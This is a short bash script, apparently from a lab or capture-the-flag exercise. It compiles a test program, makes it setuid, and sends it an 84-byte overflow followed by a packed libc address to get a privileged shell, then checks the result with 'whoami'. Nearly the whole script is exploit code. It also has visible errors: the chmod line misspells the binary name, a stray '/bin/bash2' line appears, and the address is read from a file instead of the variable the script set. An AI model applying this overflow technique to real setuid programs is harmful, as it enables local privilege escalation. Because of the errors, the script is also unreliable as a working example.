#!/bin/bash
gcc -o vuln vuln.c
chmod +s vunl
gcc -o ./getaddr getaddr.c -lc -ldl
/bin/bash2
export PATH=$PATH:.
sysaddr=$(./getaddr)
./vuln "$(perl -e 'print "A"x84 . pack("V", hex("$(<sysaddr)"))')" 2> arg
xxd arg | awk '{for(i=2; i<=NF; i++) {if ($i == "3a20") {print $(i-1); print $i; print $(i+1); print $(i+2); print $(i+3); print $(i+4); print $(i+5); print $(i+6);}}' | perl -pe 's/(..)(..)(..)(..)/\\x$4\\x$3\\x$2\\x$1/g'
./vuln "$(perl -e 'print "A"x84 . pack("V", hex("$(<sysaddr)"))')"
whoami